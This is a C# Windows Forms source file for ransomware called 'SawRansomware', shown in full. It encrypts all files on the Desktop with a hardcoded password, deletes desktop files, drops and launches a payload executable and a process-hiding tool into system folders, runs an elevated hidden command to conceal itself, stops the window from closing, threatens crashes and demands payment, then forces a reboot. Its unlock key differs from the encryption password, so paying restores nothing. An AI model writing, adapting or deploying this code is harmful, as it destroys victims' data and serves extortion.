using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Saw.Encrypt;
using Saw.DeleteDesktopFiles;
using System.IO; //Add This
using System.Diagnostics; //Add This
using System.Media; //Add This
using System.Reflection; //Add This
using System.Runtime.InteropServices;

namespace SawRansomware
{
    public partial class SawRansomware : Form
    {
        [DllImport(@"SawRansomwareLib.dll")]
        public static extern int SawRansomware_Payload();

        [DllImport(@"SawRansomwareLib.dll")]
        public static extern int DestroyWindow_SawRansomware();

        SoundPlayer saw;

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public SawRansomware()
        {
            InitializeComponent();
            Directory.CreateDirectory(@"C:\Temp\Saw");
            Extract("SawRansomware", @"C:\Temp\Saw", "Resources", "SawRansomware.wav");
            Extract("SawRansomware", @"C:\Windows", "Resources", "ProcessHider.exe");
            Extract("SawRansomware", @"C:\Temp\Saw", "Resources", "SawRansomwarePayload.exe");
            Process.Start(@"C:\Temp\Saw\SawRansomwarePayload.exe");
            saw = new SoundPlayer(@"C:\Temp\Saw\SawRansomware.wav");
            saw.PlayLooping();
            var start = DateTime.Now;
            var sawtimer = new Timer() { Interval = 1000 };
            sawtimer.Tick += (obj, args) =>
            sawtimerlabel.Text = (TimeSpan.FromMinutes(5) - (DateTime.Now - start)).ToString("hh\\:mm\\:ss");
            sawtimer.Enabled = true;
            SawRansomware_Payload();
        }

        private void unlockbutton_Click(object sender, EventArgs e)
        {
            if(textBox1.Text == "")
            {
                MessageBox.Show("WRONG KEY!!!", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                DestroyWindow_SawRansomware();
            }
            else if(textBox1.Text == "SawRans8549319HUGGER23")
            {
                MessageBox.Show("Key is Correct...", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Environment.Exit(-55632);
            }
            else
            {
                MessageBox.Show("WRONG KEY!!!", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                DestroyWindow_SawRansomware();
            }
        }

        private void rules_Click(object sender, EventArgs e)
        {
            File.WriteAllText(@"C:\Temp\Saw\SawRules.txt", "1. Don't Launch Chrome, ProcessHacker, Internet Explorer, Microsoft Edge, Firefox, OperaGX \nBecause this processes protected and called BSOD" + Environment.NewLine + "2. Don't Close This Ransomware!!! \n 3. Pay Me to Decrypt Your Files!!!");
            Process.Start("notepad", @"C:\Temp\Saw\SawRules.txt");
        }

        private void SawRansomware_Load(object sender, EventArgs e)
        {
            File.WriteAllText(@"C:\Temp\Saw\HashCodeSaw.txt", $"{this.GetHashCode()}");
            Process.Start("notepad", @"C:\Temp\Saw\HashCodeSaw.txt");
            Start_Encrypt();
            DeleteDesktopFilesSaw xxx = new DeleteDesktopFilesSaw();
            xxx.SawDeleteFilesDesktop();
            ProcessStartInfo zpao = new ProcessStartInfo();
            zpao.FileName = "cmd.exe";
            zpao.Verb = "runas";
            zpao.Arguments = "/c ProcessHider -n \"SawRansomware.exe\"";
            zpao.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(zpao);
        }
        public void Start_Encrypt()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);

            EncryptSawRansomware enc = new EncryptSawRansomware();

            string password = "SawRans8549319HUGGER123"; 
            for (int i = 0; i < files.Length; i++)
            {
                enc.FileEncrypt(files[i], password);
            }
        }

        private void SawRansomware_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var mxz = new SawPayForm();
            mxz.ShowDialog();
        }

        private void sawtimer_Tick(object sender, EventArgs e)
        {
            if(sawtimer.Interval < 1)
            {
                MessageBox.Show("Time is Up... Say Goodbye to your PC", "Saw Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.Start("shutdown", "/r /t 30");
                Environment.Exit(-6654);
            }
        }
    }
}
